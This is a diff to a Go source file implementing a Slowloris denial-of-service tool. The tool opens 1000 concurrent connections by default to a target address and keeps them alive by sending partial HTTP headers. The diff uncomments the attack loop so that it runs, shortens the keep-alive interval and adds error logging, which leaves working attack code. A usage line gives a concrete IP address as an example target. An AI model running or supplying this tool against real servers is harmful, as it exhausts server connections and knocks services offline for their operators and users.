@@ -6,15 +6,15 @@ import (
 	"math/rand"
 	"net"
 	"net/url"
+	"os"
 	"sync"
 	"time"
 )
 
 const timeOut = 3
-const sleep = 15
+const sleep = 5
 
 var target = flag.String("t", "", "the ip address of the targeted machine")
-var port string
 var routines = flag.Int("r", 1000, "the number of concurent routines")
 var wg sync.WaitGroup
 
@@ -27,12 +27,13 @@ var headers = []string{
 
 func usage() {
 	fmt.Printf("You need to specify the ip of the target machine\n")
-	fmt.Print("An example is -t http://195.17.56.213 -p 8080 \n")
+	fmt.Print("An example is -t http://195.17.56.213:8080 \n")
 	flag.PrintDefaults()
 }
 func slowLoris(target string, indx int) {
 	conn, err := net.DialTimeout("tcp", target, timeOut*time.Second)
 	if err != nil {
+		fmt.Println(err.Error())
 		fmt.Printf("Couldn't connect to %s\n", target)
 		wg.Done()
 		return
@@ -40,32 +41,40 @@ func slowLoris(target string, indx int) {
 	for _, header := range headers {
 		_, err = fmt.Fprintf(conn, header+"\r\n")
 		if err != nil {
+			fmt.Println(err.Error())
 			fmt.Printf("{%v} Couldn't send the headers to the target", indx)
 			wg.Done()
 			return
 		}
 	}
 	for {
-		_, err := fmt.Fprintf(conn, "X-a: %v\r\n", rand.Intn(5000))
+		time.Sleep(sleep * time.Second)
+		_, err := fmt.Fprintf(conn, "X-a: %v\r\n", rand.Intn(5000)+1)
 		if err != nil {
+			fmt.Println(err.Error())
 			fmt.Printf("{%v} Couln't send data to the targe, trying reopening", indx)
 			defer slowLoris(target, indx)
 			return
+		} else {
+			fmt.Printf("{%v} Sending data\n", indx)
 		}
-		time.Sleep(sleep * time.Second)
+
 	}
 
 }
 func main() {
 	flag.Usage = usage
 	flag.Parse()
-	fmt.Printf("Target: %s Port: %s Routines: %v\n", *target, *routines)
-	//fmt.Printf("The target adress: %s\n", *target)
-	u, _ := url.Parse(*target)
-	fmt.Println(u.Host)
-	/*for i := 1; i <= *routines; i++ {
-		wg.Add(1)
-		go slowLoris(*target, i)
+	if flag.NArg() < 0 {
+		fmt.Println("Insuficient arguments")
+		flag.Usage()
+		os.Exit(0)
 	}
-	wg.Wait()*/
+	fmt.Printf("Target: %s  Routines: %v\n", *target, *routines)
+	u, _ := url.Parse(*target)
+	for i := 1; i <= *routines; i++ {
+		wg.Add(1)
+		go slowLoris(u.Host, i)
+	}
+	wg.Wait()
 }
